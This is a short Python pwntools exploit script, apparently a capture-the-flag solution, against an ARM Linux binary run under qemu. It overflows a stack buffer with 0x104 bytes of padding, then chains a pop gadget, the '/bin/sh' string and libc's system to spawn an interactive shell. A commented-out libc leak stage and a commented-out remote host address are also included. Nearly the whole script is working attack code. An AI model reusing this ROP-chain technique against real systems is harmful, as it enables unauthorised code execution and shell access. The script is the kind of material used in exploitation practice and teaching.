from pwn import *
context(arch='arm',os='linux',log_level='debug')
elf=ELF('./bin')
# libc=ELF('./libc-2.31.so')
libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
def gdb_attach():
    os.system('gnome-terminal -x sh -c "gdb-multiarch ./bin -ex \'target remote 127.0.0.1:1234\'"')
# io = process(["qemu-arm","-g","1234","-L","/usr/arm-linux-gnueabihf","./bin"])
io = process(["qemu-arm","-L","/usr/arm-linux-gnueabihf","./bin"])
# io = remote("139.159.210.220",9999)
read_got=elf.got['read']
printf_got=elf.got['printf']
printf_plt = elf.plt['printf']
# print hex(libc.sym['read'])
print hex(read_got)

# payload = '\x00'*0x104+p32(0x00010348)+p32(read_got)+p32(0x000104D8)

# io.sendafter("input: ",payload)
# libc_base = u32(io.recv(4)) - libc.sym['read']
# info(hex(libc_base))
libc_base = 0xf66cc000
system=libc_base+libc.sym['system']
bin_sh=libc_base+0xca574
pop_0_4=libc_base+0x00056b7c
# gdb.attach(proc.pidof(io)[0])
payload='a'*0x104+p32(pop_0_4)+p32(bin_sh)*2+p32(system)
io.send(payload)
# io.sendline("ls")
io.interactive()